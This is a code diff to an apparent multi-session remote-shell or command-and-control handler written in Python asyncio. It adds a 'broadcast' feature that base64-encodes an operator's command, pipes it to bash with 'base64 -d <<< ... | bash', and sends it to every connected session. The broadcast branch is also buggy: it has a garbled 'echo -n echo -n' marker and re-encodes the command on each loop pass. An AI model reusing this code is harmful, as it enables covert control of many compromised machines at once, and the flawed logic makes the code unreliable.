@@ -1,4 +1,4 @@
-from threading import *
+#from threading import *
 from time import *
 from asyncio import *
 from uuid import *
@@ -14,16 +14,30 @@ async def run_cmd(reader, writer, command, host, user):
          reader._buffer.clear()
         else:
             break
+    if command.startswith("broadcast"):
+        command = command[9:]
+        targets = sesje 
+        for sesja in targets:
+            if isinstance(command, bytes):
+                command = command.decode('utf-8')
+            command = "( "+ command.strip()
+            command2 = f" && echo -n       echo -n {granica})"
+            command = base64.standard_b64encode(((command+command2).encode()))               #crafting paylaod - magic - don't touch
+            full = "base64 -d <<< ".encode() + command + " | bash\n".encode()
+            print (f"full to {full.decode()}")
+            targets[sesja].write(full)
+            await targets[sesja].drain()                                         #send and be sure that command was sent
+            await sleep(0.05)
+    else:
+        command = "( "+ command.strip()
+        command2 = f" && echo -n {granica})"
+        command = base64.standard_b64encode(((command+command2).encode()))               #crafting paylaod - magic - don't touch
+        full = "base64 -d <<< ".encode() + command + " | bash\n".encode()
+        print (f"full to {full.decode()}")
 
-    command = "( "+ command.strip()
-    command2 = f" && echo -n {granica})"
-    command = base64.standard_b64encode(((command+command2).encode()))               #crafting paylaod - magic - don't touch
-    full = "base64 -d <<< ".encode() + command + " | bash\n".encode()
-    print (f"full to {full.decode()}")
-
-    writer.write(full)
-    await writer.drain()                                         #send and be sure that command was sent
-    await sleep(0.05)
+        writer.write(full)
+        await writer.drain()                                         #send and be sure that command was sent
+        await sleep(0.05)
 
     odp = b""
     while granica.encode() not in odp:
